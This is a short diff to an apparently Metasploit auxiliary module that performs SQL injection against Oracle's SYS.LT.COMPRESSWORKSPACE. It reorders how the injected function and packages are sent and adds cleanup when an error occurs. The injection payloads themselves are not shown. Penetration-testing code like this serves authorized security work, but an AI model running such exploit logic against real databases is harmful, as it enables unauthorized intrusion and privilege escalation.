@@ -57,16 +57,21 @@ class Metasploit3 < Msf::Auxiliary
 		clean = "DROP FUNCTION #{cruft}"
 
 		print_status("Attempting sql injection on SYS.LT.COMPRESSWORKSPACE...")
+
+		print_status("Sending function...")
+		prepare_exec(function)
+		
 		begin
-			print_status("Sending function...")
-			prepare_exec(function)
-		rescue => e
-			return
+			prepare_exec(package1)
+			prepare_exec(package2)
+		rescue  => e
+			if ( e.to_s =~ /No Data/ )
+				print_status("Removing function '#{cruft}'...")
+				prepare_exec(clean)
+			else
+				return
+			end
 		end
-		prepare_exec(package1)
-		prepare_exec(package2)
-		print_status("Removing function '#{cruft}'...")
-		prepare_exec(clean)
 
 	end
 
